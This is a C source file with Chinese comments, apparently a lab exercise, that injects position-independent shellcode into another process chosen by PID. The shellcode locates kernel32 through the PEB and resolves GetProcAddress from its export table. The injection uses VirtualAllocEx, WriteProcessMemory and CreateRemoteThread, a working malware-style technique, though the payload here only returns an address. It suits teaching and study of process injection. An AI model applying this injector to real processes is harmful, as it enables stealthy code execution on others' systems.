//inj.c
#include <windows.h>
PBYTE pRemoteCode, pCode, pOrignCode;
DWORD dwSizeOfCode;

DWORD _addr_GetBaseKernel32();
DWORD _addr_GetGetProcAddrBase(DWORD base);

// code_start是二进制码的开始标记
__declspec(naked) void code_start(){

    __asm {
        push ebp
        mov  ebp, esp
        push ebx
        call _delta
_delta:
        pop  ebx
        sub  ebx, offset _delta
        lea  ecx, [ebx + _addr_GetBaseKernel32]
        call dword ptr [ecx]// 调用GetBaseKernel32()
		push eax
		lea  ecx, [ebx + _addr_GetGetProcAddrBase]// 
        call dword ptr [ecx]//调用GetProcAddrBase(base)
		add  esp,4
        mov  esp, ebp
        pop  ebp
        ret
    }
}

__declspec(naked) DWORD _addr_GetBaseKernel32()
{
    __asm {
        // ---------------------------------------------------------
		// type : DWORD GetBaseKernel32()
		_GetBaseKernel32:
				push    ebp
				mov     ebp, esp
				push    esi
				push    edi
				xor     ecx, ecx                    // ECX = 0
				mov     esi, fs:[0x30]              // ESI = &(PEB) ([FS:0x30])
				mov     esi, [esi + 0x0c]           // ESI = PEB->Ldr
				mov     esi, [esi + 0x1c]           // ESI = PEB->Ldr.InInitOrder
		_next_module:
				mov     eax, [esi + 0x08]           // EBP = InInitOrder[X].base_address
				mov     edi, [esi + 0x20]           // EBP = InInitOrder[X].module_name (unicode)
				mov     esi, [esi]                  // ESI = InInitOrder[X].flink (next module)
				cmp     [edi + 12*2], cx            // modulename[12] == 0 ?
				jne     _next_module                 // No: try next module.
				pop     edi
				pop     esi
				mov     esp, ebp
				pop     ebp	
				ret
    }
}

__declspec(naked) DWORD _addr_GetGetProcAddrBase(DWORD base)
{
    __asm {
        _GetGetProcAddrBase:
				push    ebp
				mov     ebp, esp
				push    edx
				push    ebx
				push    edi
				push    esi
				mov     ebx, [ebp+8]
				mov     eax, [ebx + 0x3c] // edi = BaseAddr, eax = pNtHeader
				mov     edx, [ebx + eax + 0x78]
				add     edx, ebx          // edx = Export Table (RVA)
				mov     ecx, [edx + 0x18] // ecx = NumberOfNames
				mov     edi, [edx + 0x20] //
				add     edi, ebx          // ebx = AddressOfNames
		_search:
				dec     ecx
				mov     esi, [edi + ecx*4]
				add     esi, ebx
				mov     eax, 0x50746547 // "PteG"
				cmp     [esi], eax
				jne     _search
				mov     eax, 0x41636f72 //"Acor"
				cmp     [esi+4], eax
				jne     _search
				mov     edi, [edx + 0x24] //
				add     edi, ebx      // edi = AddressOfNameOrdinals
				mov     cx, word ptr [edi + ecx*2]  // ecx = GetProcAddress-orinal
				mov     edi, [edx + 0x1c] //
				add     edi, ebx      // edi = AddressOfFunction
				mov     eax, [edi + ecx*4]
				add     eax, ebx      // eax = GetProcAddress
				
				pop     esi
				pop     edi
				pop     ebx
				pop     edx
				
				mov     esp, ebp
				pop     ebp
				ret
    }
}

// code_end是二进制码的结束标记 int 3
__declspec(naked) void code_end()
{
    __asm _emit 0xCC
}

// make_code()函数是将开始标记和结束标记之间的所有二进制数据拷贝到一个缓冲区中
DWORD make_code()
{
    int off; 
    __asm {
        mov edx, offset code_start
        mov dword ptr [pOrignCode], edx
        mov eax, offset code_end
        sub eax, edx
        mov dword ptr [dwSizeOfCode], eax
    }
    pCode = VirtualAlloc(NULL, dwSizeOfCode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (pCode== NULL) {
        printf("[E]: VirtualAlloc failed\n");
        return 0;
    }
    printf("[I]: VirtualAlloc ok --> at 0x%08x.\n", pCode);
    for (off = 0; off<dwSizeOfCode; off++) {
        *(pCode+off) = *(pOrignCode+off);
    }
    printf("[I]: Copy code ok --> from 0x%08x to 0x%08x with size of 0x%08x.\n", 
        pOrignCode, pCode, dwSizeOfCode);
    return dwSizeOfCode;
}

// inject_code()函数是存放在pCode所指向的缓冲区中的二进制代码注入到远程进程中
int inject_code(DWORD PID)
{
    //请填入代码，完成注入过程
	int TID=0;
	DWORD hproc, hthrd;
	int rstr, rcode, old, numx,nWrite;
	DWORD getProcAddressBase = 0;
	
	printf("pOrignCode addr: 0x%08x\n", pOrignCode);
	hproc = OpenProcess(
	  PROCESS_CREATE_THREAD  | PROCESS_QUERY_INFORMATION
	| PROCESS_VM_OPERATION   | PROCESS_VM_WRITE 
	| PROCESS_VM_READ, FALSE, PID);
	if (!hproc) printf("openprocess error \n");
	else printf("openprocess ok \n");
	pRemoteCode = (PBYTE) VirtualAllocEx(hproc, 
		0, dwSizeOfCode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);	
	printf("pRemoteCode : 0x%08x\n", pRemoteCode);
	if(WriteProcessMemory(hproc, pRemoteCode, pCode, dwSizeOfCode, &numx)){
		printf("[I]WriteProcessMemory : from 0x%08x with the size  0x%08x\n", pRemoteCode,numx);
	}else{
		printf("WriteProcessMemory failed \n");
	}
	
	hthrd = CreateRemoteThread(hproc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode,
		0, 0 , &TID);
	printf("pRemoteCode : 0x%08x\n", pRemoteCode);
	if (!hthrd) printf("CreateRemoteThread error \n");
	else printf("CreateRemoteThread ok \n");
	WaitForSingleObject(hthrd, 0xFFFFFFFF);  
	printf("hthrd : 0x%08x\n", hthrd);
	GetExitCodeThread(hthrd, &getProcAddressBase);
	printf("Base addr of GetProcAddress in hello.exe: 0x%08x\n", getProcAddressBase);
    return 0;
}
int main(int argc, char *argv[])
{
    DWORD PID = 0;
    // 为pid赋值为hello.exe的进程ID
	if (argc < 2) {
        printf("Usage: %s PID\n", argv[0]);
        return -1;
    }
    PID = atoi(argv[1]);
    if (PID <= 0) {
        printf("[E]: PID must be positive (PID>0)!\n"); 
        return -2;
    }
    make_code();
    inject_code(PID);
    return 0;
}

